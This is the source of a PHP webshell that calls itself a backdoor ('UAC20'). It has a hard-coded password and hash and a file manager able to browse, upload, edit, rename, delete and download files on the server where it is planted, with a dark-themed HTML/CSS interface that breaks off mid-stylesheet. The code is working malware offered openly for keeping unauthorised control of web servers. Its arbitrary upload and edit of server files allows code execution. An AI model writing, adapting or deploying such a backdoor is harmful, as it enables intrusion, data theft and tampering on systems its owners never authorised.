<?php
// UAC20 V1.0.0 PHP Webshell Backdoor
// AUTHOR : MatrixTM26
// GITHUB : https://github.com/MatrixTM26



// PASSWORD: SECUR1TY F1R5T


define("PASSWORD_HASH", "bc04b13eeb0a6c2f1303ca0e36263fd3");
define("SESSION_KEY", "fm_auth");
define("ROOT_DIR", __DIR__);
define("MAX_UPLOAD_MB", 20);

session_start();

if (isset($_POST["logout"])) {
    $_SESSION[SESSION_KEY] = false;
    header("Location: " . $_SERVER["PHP_SELF"]);
    exit();
}

if (isset($_POST["password"])) {
    $_SESSION[SESSION_KEY] = md5($_POST["password"]) === PASSWORD_HASH;
    if (!$_SESSION[SESSION_KEY]) {
        $loginError = "Incorrect password. Please try again.";
    }
}

$isAuthenticated = !empty($_SESSION[SESSION_KEY]);

function safePath(string $path): string|false
{
    $real = realpath($path);
    if ($real === false) {
        $parent = realpath(dirname($path));
        if ($parent === false || strpos($parent, ROOT_DIR) !== 0) {
            return false;
        }
        return $parent . DIRECTORY_SEPARATOR . basename($path);
    }
    if (strpos($real, ROOT_DIR) !== 0) {
        return false;
    }
    return $real;
}

function resolveParam(string $param): string|false
{
    return safePath(ROOT_DIR . DIRECTORY_SEPARATOR . ltrim($param, "/\\"));
}

function formatBytes(int $bytes): string
{
    if ($bytes >= 1073741824) {
        return round($bytes / 1073741824, 2) . " GB";
    }
    if ($bytes >= 1048576) {
        return round($bytes / 1048576, 2) . " MB";
    }
    if ($bytes >= 1024) {
        return round($bytes / 1024, 2) . " KB";
    }
    return $bytes . " B";
}

function relativePath(string $abs): string
{
    $rel = str_replace(ROOT_DIR, "", $abs);
    return "/" . ltrim(str_replace("\\", "/", $rel), "/");
}

function fileCategory(string $path): string
{
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    $map = [
        "image" => ["jpg", "jpeg", "png", "gif", "webp", "svg", "ico", "bmp"],
        "code" => [
            "php",
            "js",
            "ts",
            "jsx",
            "tsx",
            "css",
            "html",
            "htm",
            "json",
            "xml",
            "yaml",
            "yml",
            "sh",
            "py",
            "rb",
            "go",
            "rs",
            "java",
            "c",
            "cpp",
            "h",
        ],
        "text" => ["txt", "md", "log", "csv", "ini", "env", "conf"],
        "archive" => ["zip", "tar", "gz", "bz2", "rar", "7z"],
        "video" => ["mp4", "mkv", "avi", "mov", "webm"],
        "audio" => ["mp3", "wav", "ogg", "flac", "aac"],
        "pdf" => ["pdf"],
    ];
    foreach ($map as $cat => $exts) {
        if (in_array($ext, $exts, true)) {
            return $cat;
        }
    }
    return "other";
}

function isTextEditable(string $path): bool
{
    return in_array(fileCategory($path), ["code", "text"], true);
}

$message = "";
$messageType = "success";

if ($isAuthenticated) {
    $action = $_POST["action"] ?? ($_GET["action"] ?? "");

    if ($action === "delete") {
        $target = resolveParam($_POST["path"] ?? "");
        if (!$target) {
            $message = "Invalid path.";
            $messageType = "error";
        } elseif (is_dir($target)) {
            $it = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator(
                    $target,
                    FilesystemIterator::SKIP_DOTS
                ),
                RecursiveIteratorIterator::CHILD_FIRST
            );
            foreach ($it as $entry) {
                $entry->isDir()
                    ? rmdir($entry->getRealPath())
                    : unlink($entry->getRealPath());
            }
            rmdir($target);
            $message = "Directory deleted successfully.";
        } elseif (is_file($target)) {
            unlink($target);
            $message = "File deleted successfully.";
        } else {
            $message = "Target not found.";
            $messageType = "error";
        }
    }

    if ($action === "create_file") {
        $dir = resolveParam($_POST["dir"] ?? "");
        $name = basename($_POST["name"] ?? "");
        if (!$dir || !$name) {
            $message = "Invalid directory or filename.";
            $messageType = "error";
        } else {
            $newPath = $dir . DIRECTORY_SEPARATOR . $name;
            if (file_exists($newPath)) {
                $message = "A file with that name already exists.";
                $messageType = "error";
            } else {
                file_put_contents($newPath, "");
                $message = "File '{$name}' created.";
            }
        }
    }

    if ($action === "create_dir") {
        $dir = resolveParam($_POST["dir"] ?? "");
        $name = basename($_POST["name"] ?? "");
        if (!$dir || !$name) {
            $message = "Invalid path or directory name.";
            $messageType = "error";
        } else {
            $newPath = $dir . DIRECTORY_SEPARATOR . $name;
            if (file_exists($newPath)) {
                $message = "A directory with that name already exists.";
                $messageType = "error";
            } else {
                mkdir($newPath, 0755, true);
                $message = "Directory '{$name}' created.";
            }
        }
    }

    if ($action === "save_file") {
        $target = resolveParam($_POST["path"] ?? "");
        $content = $_POST["content"] ?? "";
        if (!$target || !is_file($target)) {
            $message = "Invalid file path.";
            $messageType = "error";
        } else {
            file_put_contents($target, $content);
            $message = "File saved successfully.";
        }
    }

    if ($action === "rename") {
        $target = resolveParam($_POST["path"] ?? "");
        $newName = basename($_POST["new_name"] ?? "");
        if (!$target || !$newName) {
            $message = "Invalid path or name.";
            $messageType = "error";
        } else {
            $dest = dirname($target) . DIRECTORY_SEPARATOR . $newName;
            rename($target, $dest);
            $message = "Renamed to '{$newName}'.";
        }
    }

    if ($action === "upload" && isset($_FILES["upload_file"])) {
        $dir = resolveParam($_POST["dir"] ?? "");
        $file = $_FILES["upload_file"];
        if (!$dir) {
            $message = "Invalid upload directory.";
            $messageType = "error";
        } elseif ($file["error"] !== UPLOAD_ERR_OK) {
            $message = "Upload failed.";
            $messageType = "error";
        } elseif ($file["size"] > MAX_UPLOAD_MB * 1048576) {
            $message = "File exceeds " . MAX_UPLOAD_MB . " MB limit.";
            $messageType = "error";
        } else {
            $dest = $dir . DIRECTORY_SEPARATOR . basename($file["name"]);
            move_uploaded_file($file["tmp_name"], $dest);
            $message = "'{$file["name"]}' uploaded successfully.";
        }
    }

    if ($action === "download") {
        $target = resolveParam($_GET["path"] ?? "");
        if ($target && is_file($target)) {
            header("Content-Type: application/octet-stream");
            header(
                'Content-Disposition: attachment; filename="' .
                    basename($target) .
                    '"'
            );
            header("Content-Length: " . filesize($target));
            readfile($target);
            exit();
        }
    }
}

$currentDirParam = $_GET["dir"] ?? "";
$currentDir = $isAuthenticated
    ? (resolveParam($currentDirParam) ?:
    ROOT_DIR)
    : ROOT_DIR;

if (!is_dir($currentDir)) {
    $currentDir = ROOT_DIR;
}

$editFilePath = "";
$editFileContent = "";

if ($isAuthenticated && isset($_GET["edit"])) {
    $ep = resolveParam($_GET["edit"]);
    if ($ep && is_file($ep) && isTextEditable($ep)) {
        $editFilePath = $ep;
        $editFileContent = file_get_contents($ep);
    }
}

$dirs = [];
$files = [];

if ($isAuthenticated) {
    foreach (new DirectoryIterator($currentDir) as $item) {
        if ($item->isDot()) {
            continue;
        }
        $info = [
            "name" => $item->getFilename(),
            "path" => relativePath($item->getRealPath()),
            "abs" => $item->getRealPath(),
            "size" => $item->isFile() ? $item->getSize() : 0,
            "mtime" => $item->getMTime(),
            "writable" => is_writable($item->getRealPath()),
            "category" => $item->isFile()
                ? fileCategory($item->getRealPath())
                : "dir",
        ];
        $item->isDir() ? ($dirs[] = $info) : ($files[] = $info);
    }
    usort($dirs, fn($a, $b) => strcmp($a["name"], $b["name"]));
    usort($files, fn($a, $b) => strcmp($a["name"], $b["name"]));
}

$breadcrumbs = [["label" => "Root", "path" => "/"]];
$relCurrent = relativePath($currentDir);
$accum = "";
foreach (array_filter(explode("/", trim($relCurrent, "/"))) as $seg) {
    $accum .= "/" . $seg;
    $breadcrumbs[] = ["label" => $seg, "path" => $accum];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>UAC20 &mdash; Backdoor</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
:root {
    --black:      #0a0a0a;
    --black2:     #111111;
    --black3:     #1a1a1a;
    --black4:     #222222;
    --black5:     #2d2d2d;
    --red:        #cc0000;
    --red2:       #e60000;
    --red3:       #ff1a1a;
    --red-dim:    rgba(204,0,0,.15);
    --red-dim2:   rgba(204,0,0,.08);
    --white:      #ffffff;
    --white2:     #f0f0f0;
    --white3:     #c8c8c8;
    --white4:     #888888;
    --white5:     #555555;
    --border:     #2a2a2a;
    --border2:    #3a3a3a;
    --radius:     8px;
    --radius-lg:  12px;
    --shadow:     0 8px 32px rgba(0,0,0,.6);
    --t:          .16s ease;
}

*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html { font-size: 15px; }

body {
    font-family: 'Inter', sans-serif;
    background: var(--black);
    color: var(--white2);
    min-height: 100vh;
    line-height: 1.6;
}

::-webkit-scrollbar { width: 5px; height: 5px; }
::-webkit-scrollbar-track { background: var(--black2); }
::-webkit-scrollbar-thumb { background: var(--black5); border-radius: 99px; }
::-webkit-scrollbar-thumb:hover { background: var(--red); }

.mono { font-family: 'JetBrains Mono', monospace; }

.login-wrap {
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 1.5rem;
    background:
        radial-gradient(ellipse 55% 45% at 20% 30%, rgba(204,0,0,.12) 0%, transparent 65%),
        radial-gradient(ellipse 40% 35% at 85% 75%, rgba(204,0,0,.07) 0%, transparent 60%),
        var(--black);
}

.login-card {
    width: 100%;
    max-width: 420px;
    background: var(--black2);
    border: 1px solid var(--border2);
    border-top: 2px solid var(--red);
    border-radius: var(--radius-lg);
    padding: 2.5rem 2rem;
    box-shadow: var(--shadow);
}

.login-logo {
    display: flex;
    align-items: center;
    gap: .65rem;
    font-size: 1.5rem;
    font-weight: 800;
    letter-spacing: -.03em;
    color: var(--white);
    margin-bottom: .5rem;
}

.login-logo i { color: var(--red); font-size: 1.3rem; }

.login-sub {
    font-size: .82rem;
    color: var(--white4);
    margin-bottom: 2rem;
    padding-bottom: 1.5rem;
    border-bottom: 1px solid var(--border);
}

.field-label {
    display: block;
    font-size: .72rem;
    font-weight: 700;
    letter-spacing: .08em;
    text-transform: uppercase;
    color: var(--white4);
    margin-bottom: .4rem;
}

.field-group { margin-bottom: 1.25rem; }

input[type="password"],
input[type="text"] {
    width: 100%;
    background: var(--black3);
    border: 1px solid var(--border2);
    border-radius: var(--radius);
    padding: .7rem 1rem;
    color: var(--white);
    font-family: 'Inter', sans-serif;
    font-size: .92rem;
    outline: none;
    transition: border-color var(--t), box-shadow var(--t);
}

input:focus {
    border-color: var(--red);
    box-shadow: 0 0 0 3px rgba(204,0,0,.2);
}

.btn {
    display: inline-flex;
    align-items: center;
    gap: .45rem;
    padding: .55rem 1.1rem;
    border-radius: var(--radius);
    font-family: 'Inter', sans-serif;
    font-size: .83rem;
    font-weight: 600;
    cursor: pointer;
    border: none;
    transition: opacity var(--t), transform var(--t), background var(--t);
    white-space: nowrap;
    text-decoration: none;
}

.btn:hover  { opacity: .85; transform: translateY(-1px); }
.btn:active { transform: translateY(0); opacity: 1; }

.btn-primary {
    background: var(--red);
    color: var(--white);
    box-shadow: 0 2px 12px rgba(204,0,0,.35);
}

.btn-primary:hover { background: var(--red2); opacity: 1; }

.btn-ghost {
    background: var(--black4);
    color: var(--white3);
    border: 1px solid var(--border2);
}

.btn-ghost:hover { color: var(--white); border-color: var(--white5); opacity: 1; }

.btn-danger {
    background: transparent;
    color: var(--red3);
    border: 1px solid rgba(204,0,0,.4);
}

.btn-danger:hover { background: var(--red-dim); opacity: 1; }

.btn-outline {
    background: transparent;
    color: var(--white3);
    border: 1px solid var(--border2);
}

.btn-outline:hover { border-color: var(--red); color: var(--red3); opacity: 1; }

.btn-sm   { padding: .32rem .7rem; font-size: .76rem; }
.btn-full { width: 100%; justify-content: center; }

.alert {
    display: flex;
    align-items: center;
    gap: .65rem;
    padding: .8rem 1.1rem;
    border-radius: var(--radius);
    font-size: .87rem;
    font-weight: 500;
    margin-bottom: 1.25rem;
    border: 1px solid transparent;
}

.alert-success {
    background: rgba(255,255,255,.05);
    border-color: rgba(255,255,255,.1);
    color: var(--white2);
}

.alert-error {
    background: var(--red-dim);
    border-color: rgba(204,0,0,.3);
    color: var(--red3);
}

.app-shell {
    display: grid;
    grid-template-rows: auto 1fr;
    min-height: 100vh;
}

.topbar {
    display: flex;
    align-items: center;
    gap: 1rem;
    padding: .8rem 1.5rem;
    background: var(--black2);
    border-bottom: 1px solid var(--border);
    position: sticky;
    top: 0;
    z-index: 100;
    flex-wrap: wrap;
}

.topbar-logo {
    display: flex;
    align-items: center;
    gap: .55rem;
    font-size: 1.1rem;
    font-weight: 800;
    letter-spacing: -.02em;
    color: var(--white);
    flex-shrink: 0;
}

.topbar-logo i { color: var(--red); }

.topbar-sep { width: 1px; height: 1.4rem; background: var(--border2); flex-shrink: 0; }

.topbar-path {
    font-family: 'JetBrains Mono', monospace;
    font-size: .72rem;
    color: var(--white5);
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    max-width: 300px;
}

.main {
    padding: 1.5rem;
    max-width: 1400px;
    width: 100%;
    margin: 0 auto;
}

.breadcrumb {
    display: flex;
    align-items: center;
    gap: .3rem;
    flex-wrap: wrap;
    margin-bottom: 1.25rem;
    font-family: 'JetBrains Mono', monospace;
    font-size: .78rem;
    background: var(--black2);
    border: 1px solid var(--border);
    border-radius: var(--radius);
    padding: .55rem .9rem;
}

.breadcrumb a {
    color: var(--red3);
    text-decoration: none;
    transition: color var(--t);
}

.breadcrumb a:hover { color: var(--white); }
.breadcrumb .bc-sep { color: var(--white5); }
.breadcrumb .bc-cur { color: var(--white3); }

.toolbar {
    display: flex;
    align-items: center;
    gap: .5rem;
    flex-wrap: wrap;
    margin-bottom: 1.25rem;
}

.toolbar-right { margin-left: auto; display: flex; gap: .5rem; flex-wrap: wrap; }

.stats-strip {
    display: flex;
    gap: .65rem;
    flex-wrap: wrap;
    margin-bottom: 1.25rem;
}

.stat-chip {
    display: flex;
    align-items: center;
    gap: .45rem;
    background: var(--black2);
    border: 1px solid var(--border);
    border-radius: var(--radius);
    padding: .4rem .85rem;
    font-size: .78rem;
    color: var(--white4);
}

.stat-chip i { color: var(--red); font-size: .8rem; }
.stat-chip strong { color: var(--white2); }

.file-table-wrap {
    background: var(--black2);
    border: 1px solid var(--border);
    border-radius: var(--radius-lg);
    overflow: hidden;
    overflow-x: auto;
}

.file-table {
    width: 100%;
    border-collapse: collapse;
    min-width: 600px;
}

.file-table th {
    background: var(--black3);
    text-align: left;
    padding: .7rem 1rem;
    font-size: .7rem;
    font-weight: 700;
    letter-spacing: .09em;
    text-transform: uppercase;
    color: var(--white5);
    border-bottom: 1px solid var(--border);
    white-space: nowrap;
}

.file-table td {
    padding: .6rem 1rem;
    font-size: .86rem;
    border-bottom: 1px solid var(--border);
    vertical-align: middle;
}

.file-table tr:last-child td { border-bottom: none; }
.file-table tbody tr { transition: background var(--t); }
.file-table tbody tr:hover { background: var(--black3); }

.file-name-cell {
    display: flex;
    align-items: center;
    gap: .6rem;
}

.file-icon {
    width: 30px;
    height: 30px;
    display: flex;
    align-items: center;
    justify-content: center;
    border-radius: 7px;
    font-size: .85rem;
    flex-shrink: 0;
    border: 1px solid transparent;
}

.icon-dir     { background: rgba(255,255,255,.05); border-color: var(--border2); color: var(--white3); }
.icon-code    { background: var(--red-dim2);       border-color: rgba(204,0,0,.2); color: var(--red3); }
.icon-image   { background: rgba(255,255,255,.04); border-color: var(--border);   color: var(--white4); }
.icon-text    { background: rgba(255,255,255,.04); border-color: var(--border);   color: var(--white4); }
.icon-archive { background: rgba(255,255,255,.04); border-color: var(--border);   color: var(--white4); }
.icon-pdf     { background: var(--red-dim2);       border-color: rgba(204,0,0,.2); color: var(--red3); }
.icon-other   { background: rgba(255,255,255,.03); border-color: var(--border);   color: var(--white5); }

.file-link {
    color: var(--white2);
    text-decoration: none;
    font-weight: 500;
    transition: color var(--t);
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    max-width: 260px;
    display: block;
}

.file-link:hover { color: var(--red3); }
.dir-link        { color: var(--white); font-weight: 600; }
.dir-link:hover  { color: var(--red3); }

.cell-mono {
    font-family: 'JetBrains Mono', monospace;
    font-size: .75rem;
    color: var(--white5);
    white-space: nowrap;
}

.perm-badge {
    display: inline-flex;
    align-items: center;
    gap: .3rem;
    padding: .15rem .5rem;
    border-radius: 4px;
    font-size: .69rem;
    font-weight: 700;
    font-family: 'JetBrains Mono', monospace;
    border: 1px solid transparent;
}

.perm-write { background: rgba(255,255,255,.05); border-color: var(--border2);   color: var(--white3); }
.perm-read  { background: var(--red-dim2);       border-color: rgba(204,0,0,.2); color: var(--red3);   }

.cat-tag {
    display: inline-block;
    padding: .12rem .5rem;
    border-radius: 4px;
    font-size: .68rem;
    font-weight: 700;
    letter-spacing: .05em;
    text-transform: uppercase;
    background: var(--black3);
    border: 1px solid var(--border2);
    color: var(--white4);
    white-space: nowrap;
}

.cat-code { background: var(--red-dim2); border-color: rgba(204,0,0,.2); color: var(--red3); }
.cat-pdf  { background: var(--red-dim2); border-color: rgba(204,0,0,.2); color: var(--red3); }
.cat-dir  { background: rgba(255,255,255,.06); border-color: var(--border2); color: var(--white2); }

.action-group {
    display: flex;
    gap: .3rem;
    justify-content: flex-end;
    flex-wrap: wrap;
}

.empty-state {
    text-align: center;
    padding: 4rem 2rem;
    color: var(--white5);
}

.empty-state i   { font-size